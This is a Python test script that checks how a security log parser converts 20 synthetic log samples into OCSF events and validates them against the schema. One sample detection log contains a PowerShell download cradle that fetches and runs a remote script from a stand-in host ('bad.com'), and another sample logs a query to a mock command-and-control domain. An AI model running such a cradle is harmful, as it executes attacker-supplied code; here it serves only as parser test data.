#!/usr/bin/env python3
"""Novel log test — completely unseen data to verify we didn't overfit."""

import sys, json, time
sys.path.insert(0, ".")
from shrike.detector.format_detector import detect_format
from shrike.extractor.tiered_extractor import TieredExtractor
from shrike.validator.ocsf_validator import OCSFValidator
from pathlib import Path

te = TieredExtractor(enable_tier1=True, enable_tier2=False, enable_tier3=False)
validator = OCSFValidator(Path("schemas/ocsf_v1.3/classes"))

novel_logs = [
    ('Apr  1 03:14:22 webprod03 nginx[8821]: 2026/04/01 03:14:22 [error] 8821#0: *194827 upstream timed out, client: 172.20.1.50, request: "POST /v2/webhooks HTTP/2.0"', 4002, "HTTP Activity"),
    ('Apr  1 03:15:00 k8s-node02 kubelet[1892]: E0401 03:15:00.123456 1892 pod_workers.go:919] "Error syncing pod" pod="production/payment-svc"', 6002, "Application Lifecycle"),
    ('{"timestamp":"2026-04-01T03:16:00Z","level":"WARNING","service":"order-api","message":"Database connection pool exhausted","pool_size":50}', 6002, "Application Lifecycle"),
    ('type=CRYPTO_KEY_USER msg=audit(1711936560.789:99999): pid=31337 uid=0 auid=1000 ses=42 op=destroy kind=server fp=SHA256:ab:cd:ef direction=? spid=31337', 3002, "Authentication"),
    ('CEF:0|Zscaler|ZPA|5.0|ZPA_AUTH|User Authentication|3|src=10.50.1.100 suser=jdoe@corp.com outcome=success', 3002, "Authentication"),
    ('{"eventSource":"iam.amazonaws.com","eventName":"CreateUser","sourceIPAddress":"203.0.113.42","userIdentity":{"userName":"admin"},"requestParameters":{"userName":"new-svc-account"}}', 3001, "Account Change"),
    ('Mar 31 23:59:59 mail-relay postfix/cleanup[9012]: ABC123DEF: message-id=<20260331235959.ABC@relay.example.com>', 4009, "Email Activity"),
    ('1711936560.123 192.168.50.10 TCP_MISS/200 15234 GET https://updates.example.com/v2/check - HIER_DIRECT/93.184.216.34 application/json', 4002, "HTTP Activity"),
    ('{"event_type":"dns_query","timestamp":"2026-04-01T03:18:00Z","client_ip":"10.0.1.50","query":"c2-server.evil.com","query_type":"A","response_code":"NXDOMAIN"}', 4003, "DNS Activity"),
    ('Apr  1 03:19:00 bastion sshd[4567]: error: maximum authentication attempts exceeded for invalid user contractor from 198.51.100.42 port 59876 ssh2', 3002, "Authentication"),
    ('id=firewall time="2026-04-01 03:20:00" fw=fw-east-01 pri=5 src=10.10.0.50:443 dst=192.168.1.100:54321 proto=tcp action=deny rule=block-outbound', 4001, "Network Activity"),
    ('{"severity":"CRITICAL","rule_id":"T1059.001","rule_name":"Suspicious PowerShell Download Cradle","host":"ws-finance-04","user":"svc_reporting","process":"powershell.exe","command_line":"powershell -ep bypass -nop IEX(IWR http://bad.com/stager.ps1)","mitre_tactic":"Execution"}', 2004, "Detection Finding"),
    ('Apr  1 03:21:00 vpn-concentrator openvpn[2345]: client01/172.16.0.50:1194 MULTI: primary virtual IP for client01: 10.8.0.6', 4013, "Tunnel Activity"),
    ('{"@timestamp":"2026-04-01T03:22:00Z","observer":{"vendor":"Fortinet"},"source":{"ip":"10.0.0.1"},"destination":{"ip":"8.8.8.8"},"network":{"transport":"udp"},"event":{"action":"accept"}}', 4001, "Network Activity"),
    ('2026-04-01 03:23:00 [ALERT] haproxy: backend web-cluster has no server available! frontend=https-in client=10.0.1.50:43210', 6002, "Application Lifecycle"),
    ('Apr  1 03:24:00 radius-01 radiusd[6789]: Login OK: [jsmith] (from client vpn-gw port 0 cli 10.20.30.40)', 3002, "Authentication"),
    ('{"log_type":"audit","action":"secret.read","path":"secret/data/prod/database","client_address":"10.0.1.50","auth_type":"token","display_name":"svc-deploy","timestamp":"2026-04-01T03:25:00Z"}', 6003, "API Activity"),
    ('LEEF:2.0|Symantec|Endpoint Protection|14.3|Malware Found|cat=Security|src=10.0.1.50|sev=8|malwareName=Trojan.Gen.2', 2004, "Detection Finding"),
    ('Apr  1 03:26:00 ntp-server ntpd[111]: synchronized to 129.6.15.28, stratum 1', 4012, "NTP Activity"),
    ('2 987654321012 eni-0abc123def456789 10.0.0.50 52.94.76.1 443 54321 6 15 3000 1711936800 1711936860 ACCEPT OK', 4001, "Network Activity"),
]

print(f"NOVEL LOG TEST — {len(novel_logs)} completely unseen logs")
print(f"Patterns: {te.pattern_count}")
print("=" * 80)

valid_count = 0
rich_count = 0  # Logs where we extracted real data, not just defaults

for i, (log, cls_uid, cls_name) in enumerate(novel_logs):
    fmt = detect_format(log)
    start = time.monotonic()
    result, tier = te.extract(log, fmt, cls_uid, cls_name)
    elapsed = (time.monotonic() - start) * 1000

    v = validator.validate(result.event, class_uid=result.class_uid or cls_uid)
    if v.valid:
        valid_count += 1

    # Check data quality — did we extract REAL values, not just "unknown"?
    real_fields = 0
    for k, val in result.event.items():
        if k in ("class_uid", "class_name", "category_uid", "category_name", "activity_id", "severity_id"):
            continue
        val_str = json.dumps(val) if isinstance(val, (dict, list)) else str(val)
        if "unknown" not in val_str.lower() and val_str not in ("0", "1", ""):
            real_fields += 1

    is_rich = real_fields >= 2
    if is_rich:
        rich_count += 1

    icon = "✅" if v.valid else "❌"
    quality = "★" if is_rich else "○"

    print(f"  {i+1:2d}. {icon}{quality} T{tier} [{elapsed:.1f}ms] {cls_name:28s} {len(result.event):2d}f ({real_fields} real)")

print()
print(f"{'=' * 80}")
print(f"  Valid OCSF:     {valid_count}/{len(novel_logs)} ({valid_count/len(novel_logs)*100:.0f}%)")
print(f"  Rich extraction: {rich_count}/{len(novel_logs)} ({rich_count/len(novel_logs)*100:.0f}%) — real data, not just defaults")
print(f"  Shallow (defaults only): {valid_count - rich_count}/{len(novel_logs)}")
